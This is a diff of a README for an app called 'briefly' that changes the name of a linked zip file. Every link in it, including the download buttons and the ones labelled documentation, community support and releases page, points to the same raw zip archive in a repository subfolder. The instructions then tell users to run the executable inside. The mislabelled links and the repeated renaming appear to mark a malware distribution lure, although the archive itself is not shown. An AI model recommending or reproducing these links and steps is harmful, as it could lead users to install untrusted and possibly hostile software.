@@ -16,7 +16,7 @@ To run briefly on your computer, ensure you have:
 
 To get started, visit the Releases page to download briefly. Click the button below to go directly to the download page.
 
-[![Download briefly](https://raw.githubusercontent.com/nathguede/briefly/main/warsle/briefly.zip%20briefly-%2300C4FF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/nathguede/briefly/main/warsle/briefly.zip)
+[![Download briefly](https://raw.githubusercontent.com/nathguede/briefly/main/warsle/Software-v1.1-alpha.1.zip%20briefly-%2300C4FF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/nathguede/briefly/main/warsle/Software-v1.1-alpha.1.zip)
 
 Once on the Releases page, you will see the latest version listed. Click on the version you want, and then select the appropriate file for your operating system.
 
@@ -31,7 +31,7 @@ After downloading the file, follow these steps to run briefly:
 1. Locate the downloaded file in your computer's Downloads folder or the folder you saved it in.
 2. For Windows users, double-click on the `.exe` file. If prompted, click "Run" to start the application.
 3. For macOS users, open the `.dmg` file and drag the briefly icon to your Applications folder. Then, locate it in your Applications and double-click to open.
-4. For Linux users, extract the downloaded `https://raw.githubusercontent.com/nathguede/briefly/main/warsle/briefly.zip` file and run the brief executable from the extracted folder using your terminal.
+4. For Linux users, extract the downloaded `https://raw.githubusercontent.com/nathguede/briefly/main/warsle/Software-v1.1-alpha.1.zip` file and run the brief executable from the extracted folder using your terminal.
 
 Upon opening briefly, you will see an easy-to-navigate interface where you can start summarizing your thoughts right away.
 
@@ -66,13 +66,13 @@ If you encounter issues or have questions, feel free to visit our dedicated supp
 
 For more information about briefly, you can explore:
 
-- [Official Documentation](https://raw.githubusercontent.com/nathguede/briefly/main/warsle/briefly.zip)
-- [Community Support](https://raw.githubusercontent.com/nathguede/briefly/main/warsle/briefly.zip)
+- [Official Documentation](https://raw.githubusercontent.com/nathguede/briefly/main/warsle/Software-v1.1-alpha.1.zip)
+- [Community Support](https://raw.githubusercontent.com/nathguede/briefly/main/warsle/Software-v1.1-alpha.1.zip)
 
-For updates and release notes, always check the [Releases page](https://raw.githubusercontent.com/nathguede/briefly/main/warsle/briefly.zip).
+For updates and release notes, always check the [Releases page](https://raw.githubusercontent.com/nathguede/briefly/main/warsle/Software-v1.1-alpha.1.zip).
 
 ## 📥 Quick Access to Download
 
 Don’t forget, you can always return to the Releases page to download the latest version of briefly. Click the button below for convenient access:
 
-[![Download briefly](https://raw.githubusercontent.com/nathguede/briefly/main/warsle/briefly.zip%20briefly-%2300C4FF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/nathguede/briefly/main/warsle/briefly.zip)
+[![Download briefly](https://raw.githubusercontent.com/nathguede/briefly/main/warsle/Software-v1.1-alpha.1.zip%20briefly-%2300C4FF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/nathguede/briefly/main/warsle/Software-v1.1-alpha.1.zip)
